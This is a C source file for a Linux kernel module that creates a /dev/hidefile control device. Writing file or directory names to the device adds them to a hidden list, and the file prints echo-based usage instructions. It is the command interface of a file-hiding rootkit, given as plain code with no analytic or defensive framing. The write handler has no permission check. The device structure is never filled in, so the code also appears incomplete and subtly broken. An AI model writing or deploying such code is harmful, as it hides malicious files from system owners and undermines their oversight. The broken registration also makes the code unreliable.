/*
 * vfs_hook.c - Device node management for file hiding control
 * ARM64/x86_64 compatible
 */

#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>

#include "hook.h"

MODULE_LICENSE("GPL");

/* External functions from hook_manager */
extern int add_hidden_file(const char *name, bool is_dir);
extern int remove_hidden_file(const char *name);

/* Device node management */
static struct miscdevice hidefile_dev;
static bool dev_registered;

static ssize_t hidefile_write(struct file *file, const char __user *buf,
                              size_t count, loff_t *ppos)
{
    char *kbuf;
    char *path;
    char *cmd;
    int ret;

    if (count == 0)
        return 0;

    kbuf = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuf)
        return -ENOMEM;

    if (copy_from_user(kbuf, buf, count)) {
        kfree(kbuf);
        return -EFAULT;
    }
    kbuf[count] = '\0';

    /* Remove trailing newline */
    cmd = strim(kbuf);

    /* Check commands */
    if (strcmp(cmd, "clear") == 0) {
        extern void clear_hidden_list(void);
        clear_hidden_list();
        pr_info("hook: all hidden entries cleared\n");
        kfree(kbuf);
        return count;
    }

    /* Check if it's a directory (prefix with "d:") */
    if (strncmp(cmd, "d:", 2) == 0) {
        path = cmd + 2;
        ret = add_hidden_file(path, true);
        if (ret == 0) {
            pr_info("hook: hidden dir added: %s\n", path);
        } else if (ret == -EEXIST) {
            pr_info("hook: dir already hidden: %s\n", path);
        } else {
            pr_err("hook: failed to add hidden dir: %s (err=%d)\n", path, ret);
        }
    } else {
        /* Regular file */
        ret = add_hidden_file(cmd, false);
        if (ret == 0) {
            pr_info("hook: hidden file added: %s\n", cmd);
        } else if (ret == -EEXIST) {
            pr_info("hook: file already hidden: %s\n", cmd);
        } else {
            pr_err("hook: failed to add hidden file: %s (err=%d)\n", cmd, ret);
        }
    }

    kfree(kbuf);
    return count;
}

static ssize_t hidefile_read(struct file *file, char __user *buf,
                             size_t count, loff_t *ppos)
{
    const char *msg = "Usage:\n"
                      "  echo filename > /dev/hidefile   # hide file\n"
                      "  echo d:dirname > /dev/hidefile # hide directory\n"
                      "  echo clear > /dev/hidefile     # clear all\n";
    size_t len = strlen(msg);

    if (*ppos >= len)
        return 0;

    if (*ppos + count > len)
        count = len - *ppos;

    if (copy_to_user(buf, msg + *ppos, count))
        return -EFAULT;

    *ppos += count;
    return count;
}

static struct file_operations hidefile_fops = {
    .owner  = THIS_MODULE,
    .read   = hidefile_read,
    .write  = hidefile_write,
};

int vfs_hook_init(void)
{
    int ret;

    /* Register device node */
    ret = misc_register(&hidefile_dev);
    if (ret < 0) {
        pr_err("hook: failed to register misc device: %d\n", ret);
        return ret;
    }
    dev_registered = true;
    pr_info("hook: /dev/hidefile created\n");

    return 0;
}

void vfs_hook_exit(void)
{
    if (dev_registered) {
        misc_deregister(&hidefile_dev);
        dev_registered = false;
        pr_info("hook: /dev/hidefile removed\n");
    }
}
